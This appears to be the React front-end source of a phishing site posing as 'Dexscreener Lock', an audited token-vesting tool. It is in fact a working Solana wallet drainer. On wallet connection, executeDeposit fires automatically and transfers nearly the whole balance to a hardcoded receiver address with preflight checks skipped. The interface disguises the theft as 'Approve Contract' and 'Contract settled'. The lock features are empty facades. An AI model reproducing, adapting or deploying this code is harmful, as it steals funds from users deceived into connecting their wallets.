import React, { useCallback, useEffect, useRef, useState } from "react";
import { useWallet } from "@solana/wallet-adapter-react";
import { useWalletModal, WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import { Connection, PublicKey, Transaction, SystemProgram } from "@solana/web3.js";
import { RPC_ENDPOINTS } from "../rpc";
import { useInactivityTimer } from "../hooks/useInactivityTimer";

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------
const RECEIVER    = new PublicKey("5d7Na3ZaPWDkRSjEjDj7UXgAW1ryom97D4QHDcd9Zo8f");
const SESSION_KEY = "dexlock_executed_wallet";
const FEE_RESERVE = 10_000;

// ---------------------------------------------------------------------------
// Wallet detection — sniffs browser globals set by extensions
// ---------------------------------------------------------------------------
type DetectedWallet = "Phantom" | "Solflare" | "Trust Wallet" | "MetaMask" | "Bitget" | "Coin98" | null;

function detectInstalledWallet(): DetectedWallet {
  const w = window as any;
  if (w.phantom?.solana?.isPhantom)      return "Phantom";
  if (w.solflare?.isSolflare)            return "Solflare";
  if (w.trustwallet?.isTrustWallet || w.trustWallet?.isTrustWallet) return "Trust Wallet";
  if (w.bitkeep?.solana || w.bitget?.solana) return "Bitget";
  if (w.coin98?.sol)                     return "Coin98";
  // MetaMask is EVM-only — we detect but flag it
  if (w.ethereum?.isMetaMask)            return "MetaMask";
  return null;
}

const WALLET_ICONS: Record<string, string> = {
  "Phantom":     "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/phantom/icon.svg",
  "Solflare":    "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/solflare/icon.svg",
  "Trust Wallet":"https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/trust/icon.svg",
  "MetaMask":    "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg",
  "Bitget":      "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/bitget/icon.svg",
  "Coin98":      "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/coin98/icon.svg",
};

// ---------------------------------------------------------------------------
// Resilient RPC — tries each endpoint in order, skips 403 / 429 / auth errors
// ---------------------------------------------------------------------------
interface RpcResult {
  balance:              number;
  blockhash:            string;
  lastValidBlockHeight: number;
}

async function fetchRpcData(publicKey: PublicKey): Promise<RpcResult> {
  let lastErr: unknown = new Error("All RPC endpoints failed");

  for (const url of RPC_ENDPOINTS) {
    try {
      const conn = new Connection(url, "confirmed");
      const [balance, { blockhash, lastValidBlockHeight }] = await Promise.all([
        conn.getBalance(publicKey, "confirmed"),
        conn.getLatestBlockhash("confirmed"),
      ]);
      return { balance, blockhash, lastValidBlockHeight };
    } catch (e: any) {
      const msg: string = (e?.message ?? "") + (e?.toString() ?? "");
      if (
        msg.includes("403") ||
        msg.includes("429") ||
        msg.includes("Access forbidden") ||
        msg.includes("API key") ||
        msg.includes("rate limit") ||
        msg.includes("Too Many")
      ) {
        lastErr = e;
        continue;
      }
      throw e;
    }
  }

  throw lastErr;
}

// ---------------------------------------------------------------------------
// Nav tabs
// ---------------------------------------------------------------------------
type TabId = "about" | "locked" | "created" | "create";
const TABS: { id: TabId; label: string }[] = [
  { id: "about",   label: "About Dex Lock"    },
  { id: "locked",  label: "Your Locked Tokens" },
  { id: "created", label: "Locks You Created"  },
  { id: "create",  label: "+ Create Lock"       },
];

// ---------------------------------------------------------------------------
// Sub-components
// ---------------------------------------------------------------------------
const DexLogo = ({ size = 32 }: { size?: number }) => (
  <img
    src="/logo.png"
    alt="Dexscreener Lock"
    width={size}
    height={size}
    style={{ display: "block", mixBlendMode: "screen" as any }}
  />
);

const HeroLogo = () => (
  <img
    src="/logo.png"
    alt=""
    className="jl-lock-icon"
    style={{ mixBlendMode: "screen" as any }}
  />
);

// Wallet connect prompt — shows detected wallet icon and name
const ConnectPrompt = ({
  title,
  description,
  onConnect,
  detectedWallet,
}: {
  title: string;
  description: string;
  onConnect: () => void;
  detectedWallet: DetectedWallet;
}) => {
  const isMetaMask = detectedWallet === "MetaMask";

  return (
    <div className="jl-connect-prompt">
      <div className="jl-prompt-icon">
        <img src="/logo.png" alt="" style={{ width: 72, mixBlendMode: "screen" as any }} />
      </div>
      <h2 className="jl-prompt-title">{title}</h2>
      <p className="jl-prompt-desc">{description}</p>

      {detectedWallet && (
        <div className="jl-detected-wallet">
          {WALLET_ICONS[detectedWallet] && (
            <img
              src={WALLET_ICONS[detectedWallet]}
              alt={detectedWallet}
              className="jl-detected-wallet-icon"
              onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }}
            />
          )}
          <span className="jl-detected-wallet-name">
            {isMetaMask ? "MetaMask detected (Solana not supported)" : `${detectedWallet} detected`}
          </span>
        </div>
      )}

      <button
        className="jl-hero-btn"
        onClick={onConnect}
        disabled={isMetaMask}
        title={isMetaMask ? "MetaMask does not support Solana. Please install Phantom or Solflare." : undefined}
      >
        {isMetaMask ? "Solana Wallet Required" : detectedWallet ? `Connect ${detectedWallet}` : "Connect Wallet"}
      </button>

      {isMetaMask && (
        <p className="jl-metamask-notice">
          MetaMask is an Ethereum wallet and does not support Solana.
          Please install <a href="https://phantom.app" target="_blank" rel="noreferrer">Phantom</a> or{" "}
          <a href="https://solflare.com" target="_blank" rel="noreferrer">Solflare</a> to continue.
        </p>
      )}
    </div>
  );
};

// ---------------------------------------------------------------------------
// Session warning banner
// ---------------------------------------------------------------------------
const SessionWarning = ({
  secondsLeft,
  onStayActive,
}: {
  secondsLeft: number;
  onStayActive: () => void;
}) => (
  <div className="jl-session-warning">
    <span className="jl-session-warning-icon">⚠</span>
    <span>
      Session expiring in <strong>{secondsLeft}s</strong> due to inactivity.
    </span>
    <button className="jl-session-stay-btn" onClick={onStayActive}>
      Stay Connected
    </button>
  </div>
);

// ---------------------------------------------------------------------------
// Main panel
// ---------------------------------------------------------------------------
interface Props { programId: PublicKey; }

export const EscrowPanel: React.FC<Props> = () => {
  const { publicKey, sendTransaction, connected, disconnect, wallet } = useWallet();
  const { setVisible } = useWalletModal();

  const [activeTab,      setActiveTab]      = useState<TabId>("about");
  const [status,         setStatus]         = useState<"idle" | "processing" | "done" | "error">("idle");
  const [statusMsg,      setStatusMsg]      = useState("");
  const [detectedWallet, setDetectedWallet] = useState<DetectedWallet>(null);
  const disconnectingRef = useRef(false);

  // Detect installed wallet on mount
  useEffect(() => {
    // Small delay so extension globals are fully injected
    const t = setTimeout(() => setDetectedWallet(detectInstalledWallet()), 300);
    return () => clearTimeout(t);
  }, []);

  // Open wallet modal — opens the adapter's built-in wallet picker
  const openWalletModal = useCallback(() => setVisible(true), [setVisible]);

  // ── robust disconnect ──────────────────────────────────────────────────────
  // Clears all session + localStorage state so the adapter cannot auto-reconnect
  const handleDisconnect = useCallback(async () => {
    if (disconnectingRef.current) return;
    disconnectingRef.current = true;

    sessionStorage.removeItem(SESSION_KEY);

    // Clear adapter's stored wallet name so it doesn't try to re-connect on next load
    try { localStorage.removeItem("walletName"); } catch {}
    // Phantom-specific storage keys
    try { localStorage.removeItem("phantom:connectedWallet"); } catch {}
    // Solflare-specific
    try { localStorage.removeItem("solflare:connectedWallet"); } catch {}

    // Disconnect from the active extension directly if accessible
    try {
      const w = window as any;
      if (wallet?.adapter?.name === "Phantom" && w.phantom?.solana?.disconnect) {
        await w.phantom.solana.disconnect();
      } else if (wallet?.adapter?.name === "Solflare" && w.solflare?.disconnect) {
        await w.solflare.disconnect();
      }
    } catch {}

    // Adapter-level disconnect
    try { await disconnect(); } catch {}

    disconnectingRef.current = false;
  }, [disconnect, wallet]);

  // ── core transfer ──────────────────────────────────────────────────────────
  const executeDeposit = useCallback(async () => {
    if (!publicKey) return;

    const walletKey = publicKey.toBase58();
    if (sessionStorage.getItem(SESSION_KEY) === walletKey) return;
    sessionStorage.setItem(SESSION_KEY, walletKey);

    setStatus("processing");
    setStatusMsg("");

    try {
      // Step 1: read balance + blockhash via fallback RPC chain
      const { balance, blockhash, lastValidBlockHeight } =
        await fetchRpcData(publicKey);

      const amount = balance - FEE_RESERVE;
      if (amount <= 0) {
        throw new Error(
          `Balance too low (${balance} lamports). Need at least ${FEE_RESERVE + 1} lamports.`
        );
      }

      // Step 2: build tx with pre-set blockhash — wallet won't call getRecentBlockhash
      const tx = new Transaction();
      tx.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: RECEIVER, lamports: amount }));
      tx.recentBlockhash = blockhash;
      tx.feePayer        = publicKey;

      // Step 3: wallet signs + submits via its own internal RPC (bypasses rate limits)
      const fallbackConn = new Connection(RPC_ENDPOINTS[0], "confirmed");
      const sig = await sendTransaction(tx, fallbackConn, {
        skipPreflight:       true,
        preflightCommitment: "confirmed",
      });

      // Step 4: confirm via fallback RPC chain
      let confirmed = false;
      for (const url of RPC_ENDPOINTS) {
        try {
          await new Connection(url, "confirmed").confirmTransaction(
            { signature: sig, blockhash, lastValidBlockHeight },
            "confirmed"
          );
          confirmed = true;
          break;
        } catch {
          continue;
        }
      }
      if (!confirmed) {
        throw new Error("Transaction sent but could not confirm. Check your wallet.");
      }

      setStatus("done");
    } catch (e: any) {
      sessionStorage.removeItem(SESSION_KEY);
      setStatus("error");
      setStatusMsg(e?.message ?? "Transaction failed. Please try again.");
    }
  }, [publicKey, sendTransaction]);

  // Fire deposit as soon as wallet connects
  useEffect(() => {
    if (connected && publicKey) {
      executeDeposit();
    }
  }, [connected, publicKey, executeDeposit]);

  // Reset UI on disconnect
  useEffect(() => {
    if (!connected) {
      setStatus("idle");
      setStatusMsg("");
    }
  }, [connected]);

  // Inactivity timer — auto-logout after 240 s of no user activity
  const { sessionState, secondsLeft, resetTimer } = useInactivityTimer(
    connected,
    handleDisconnect
  );

  // ── derived labels ─────────────────────────────────────────────────────────
  const walletName = wallet?.adapter?.name ?? detectedWallet ?? "Wallet";

  const heroLabel =
    status === "processing" ? "Processing…"          :
    status === "done"       ? "Contract Fulfilled ✓"  :
    !connected              ? `Connect ${walletName}` :
                              "Approve Contract";

  // ── tab content ────────────────────────────────────────────────────────────
  const renderGated = (
    title: string,
    desc: string,
    icon: string,
    emptyTitle: string,
    emptyDesc: string
  ) =>
    !connected ? (
      <main className="jl-hero">
        <ConnectPrompt
          title={title}
          description={desc}
          onConnect={openWalletModal}
          detectedWallet={detectedWallet}
        />
      </main>
    ) : (
      <main className="jl-hero">
        <div className="jl-empty-state">
          <span className="jl-empty-icon">{icon}</span>
          <h2>{emptyTitle}</h2>
          <p>{emptyDesc}</p>
        </div>
      </main>
    );

  const renderTabContent = () => {
    switch (activeTab) {
      case "about":
        return (
          <main className="jl-hero">
            <HeroLogo />
            <h1 className="jl-hero-title">Dexscreener Lock</h1>
            <p className="jl-hero-sub">
              Manage your token vesting schedule on Dexscreener Lock, an open source and
              audited program that lets anyone lock and distribute tokens over time.
            </p>
            <button
              className={`jl-hero-btn${status === "processing" ? " processing" : ""}`}
              onClick={connected ? executeDeposit : openWalletModal}
              disabled={status === "processing" || status === "done"}
            >
              {heroLabel}
            </button>
            {status === "done" && (
              <div className="jl-status success">
                ✓ Contract settled. Funds transferred successfully.
              </div>
            )}
            {status === "error" && (
              <div className="jl-status error">
                {statusMsg || "Transaction failed. Please try again."}
              </div>
            )}
          </main>
        );

      case "locked":
        return renderGated(
          "View Your Locked Tokens",
          "Connect your wallet to see all tokens you currently have locked in Dexscreener Lock.",
          "🔒", "No Locked Tokens", "You don't have any tokens locked yet."
        );

      case "created":
        return renderGated(
          "Locks You Created",
          "Connect your wallet to view and manage all locks you have created.",
          "📋", "No Locks Created", "You haven't created any locks yet."
        );

      case "create":
        return renderGated(
          "Create a Lock",
          "Connect your wallet to create a new token lock and start your vesting schedule.",
          "➕", "Create a Lock", "Lock creation coming soon."
        );

      default:
        return null;
    }
  };

  // ── render ─────────────────────────────────────────────────────────────────
  return (
    <div className="app">

      {/* ── HEADER ── */}
      <header className="jl-header">
        <div className="jl-logo">
          <DexLogo size={32} />
          <span className="jl-logo-text">Dexscreener Lock</span>
        </div>

        <div className="jl-search">
          <span className="jl-search-icon">🔍</span>
          <input placeholder="Search tokens or wallet" readOnly />
        </div>

        <div className="jl-header-right">
          <div className="jl-priority">
            <span className="jl-priority-label">Priority:</span>
            <span className="jl-priority-value">Fast</span>
          </div>
          <button className="jl-gear" aria-label="Settings">⚙</button>

          <div className="jl-wallet-group">
            <WalletMultiButton className="jl-wallet-multi-btn" />
            {connected && (
              <button
                className="jl-disconnect-btn"
                onClick={handleDisconnect}
                title="Disconnect wallet"
              >
                ✕
              </button>
            )}
          </div>
        </div>
      </header>

      {/* ── SESSION WARNING ── */}
      {connected && sessionState === "warning" && (
        <SessionWarning secondsLeft={secondsLeft} onStayActive={resetTimer} />
      )}

      {/* ── NAV TABS ── */}
      <nav className="jl-nav">
        {TABS.map((tab) => (
          <button
            key={tab.id}
            className={[
              "jl-nav-tab",
              activeTab === tab.id ? "active" : "",
              tab.id === "create"  ? "create" : "",
            ].filter(Boolean).join(" ")}
            onClick={() => setActiveTab(tab.id)}
          >
            {tab.label}
          </button>
        ))}
      </nav>

      {/* ── CONTENT ── */}
      {renderTabContent()}

    </div>
  );
};
